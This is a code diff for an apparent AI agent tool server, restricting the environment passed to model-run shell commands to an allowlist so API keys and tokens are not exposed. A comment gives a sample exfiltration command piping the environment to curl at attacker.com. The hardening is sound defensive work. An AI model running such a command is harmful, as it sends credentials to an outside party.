@@ -92,16 +92,52 @@ func rewriteCommandPaths(command, sandbox string) string {
 
 // sandboxEnv returns the current environment with HOME and TMPDIR pointed at
 // the sandbox, preventing shell expansions like ~ from escaping.
-func sandboxEnv(sandbox string) []string {
-	env := os.Environ()
-	result := make([]string, 0, len(env)+2)
-	for _, e := range env {
-		if strings.HasPrefix(e, "HOME=") || strings.HasPrefix(e, "TMPDIR=") {
-			continue
-		}
-		result = append(result, e)
+// execEnvAllowlist names the environment variables that are safe to expose to
+// shell commands run by the exec/start_service tools. Secrets (API keys,
+// tokens, DB credentials) are deliberately NOT passed through — a command like
+// `env | curl attacker.com` must not be able to exfiltrate them. Operators can
+// add names via VEGA_EXEC_ENV_PASSTHROUGH (comma-separated).
+var execEnvAllowlist = map[string]bool{
+	"PATH": true, "LANG": true, "LC_ALL": true, "LC_CTYPE": true,
+	"TERM": true, "TZ": true, "USER": true, "LOGNAME": true, "SHELL": true,
+	"GOPATH": true, "GOCACHE": true, "GOMODCACHE": true, "GOFLAGS": true,
+}
+
+// execEnvPassthrough returns operator-configured extra allowlist entries.
+func execEnvPassthrough() map[string]bool {
+	extra := strings.TrimSpace(os.Getenv("VEGA_EXEC_ENV_PASSTHROUGH"))
+	if extra == "" {
+		return nil
 	}
-	return append(result, "HOME="+sandbox, "TMPDIR="+sandbox)
+	set := make(map[string]bool)
+	for _, name := range strings.Split(extra, ",") {
+		if n := strings.TrimSpace(name); n != "" {
+			set[n] = true
+		}
+	}
+	return set
+}
+
+// sandboxEnv builds the environment for a shell command. It filters the
+// server's environment down to a safe allowlist so secrets are never exposed
+// to model-driven commands, and pins HOME/TMPDIR into the sandbox when one is
+// configured. An empty sandbox still gets the filtered environment.
+func sandboxEnv(sandbox string) []string {
+	extra := execEnvPassthrough()
+	result := make([]string, 0, len(execEnvAllowlist)+len(extra)+2)
+	for _, e := range os.Environ() {
+		name, _, _ := strings.Cut(e, "=")
+		if name == "HOME" || name == "TMPDIR" {
+			continue // set explicitly below when sandboxed
+		}
+		if execEnvAllowlist[name] || extra[name] {
+			result = append(result, e)
+		}
+	}
+	if sandbox != "" {
+		result = append(result, "HOME="+sandbox, "TMPDIR="+sandbox)
+	}
+	return result
 }
 
 // RegisterBuiltins adds the built-in tools.
@@ -253,9 +289,9 @@ func (t *Tools) RegisterBuiltins() {
 
 			cmd := exec.CommandContext(execCtx, "sh", "-c", command)
 			cmd.Dir = workdir
-			if sandbox != "" {
-				cmd.Env = sandboxEnv(sandbox)
-			}
+			// Always use the filtered environment so secrets aren't exposed to
+			// model-driven commands, sandbox or not.
+			cmd.Env = sandboxEnv(sandbox)
 
 			var buf bytes.Buffer
 			cmd.Stdout = &buf
@@ -334,9 +370,7 @@ func (t *Tools) RegisterBuiltins() {
 
 			cmd := exec.Command("sh", "-c", command)
 			cmd.Dir = workdir
-			if sandbox != "" {
-				cmd.Env = sandboxEnv(sandbox)
-			}
+			cmd.Env = sandboxEnv(sandbox)
 
 			output := newRingBuffer(8192)
 			cmd.Stdout = output
